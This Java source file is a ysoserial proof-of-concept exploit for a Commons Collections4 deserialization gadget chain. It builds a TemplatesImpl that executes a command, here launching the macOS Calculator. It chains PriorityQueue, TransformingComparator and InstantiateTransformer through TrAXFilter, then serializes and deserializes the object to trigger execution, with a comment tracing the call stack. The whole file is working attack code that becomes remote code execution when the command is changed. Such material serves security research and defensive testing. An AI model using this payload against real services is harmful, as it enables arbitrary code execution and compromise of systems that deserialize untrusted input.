package ysoserial.payloads.tabbyGadgetChains.CommonCollections4;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.PriorityQueue;


/**
 * readObject:795, PriorityQueue (java.util)
 * heapify:736, PriorityQueue (java.util)
 * siftDown:687, PriorityQueue (java.util)
 * siftDownUsingComparator:721, PriorityQueue (java.util)
 * compare:81, TransformingComparator (org.apache.commons.collections4.comparators)
 * transform:112, ChainedTransformer (org.apache.commons.collections4.functors)
 * transform:32, InstantiateTransformer (org.apache.commons.collections4.functors)
 * transform:116, InstantiateTransformer (org.apache.commons.collections4.functors)
 * newInstance:422, Constructor (java.lang.reflect)
 * newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
 * newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
 * <init>:64, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)
 * newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * newInstance()
 */


public class CC4_Poc2 {
    public static void main(String[] args) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl("/Applications/Calculator.app/Contents/MacOS/Calculator");

        ConstantTransformer constant = new ConstantTransformer(String.class);

        Class[] paramTypes = new Class[] { String.class };
        Object[] arg = new Object[] { "foo" };
        InstantiateTransformer instantiate = new InstantiateTransformer(
                paramTypes, arg);


        Transformer[] transformers = new Transformer[]{
                constant, instantiate
        };

        PriorityQueue priorityQueue = new PriorityQueue(new TransformingComparator(new ChainedTransformer(transformers)));

        priorityQueue.add(1);
        priorityQueue.add(2);

        Reflections.setDeclaredField(constant, "iConstant", TrAXFilter.class);
        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
        arg = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");
        paramTypes[0] = Templates.class;
        arg[0] = templates;



        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream oout = new ObjectOutputStream(bout);
        oout.writeObject(priorityQueue);
        oout.close();


        //         deserialize
        ObjectInputStream oin = new ObjectInputStream(new ByteArrayInputStream(bout.toByteArray()));
        oin.readObject();

    }
}
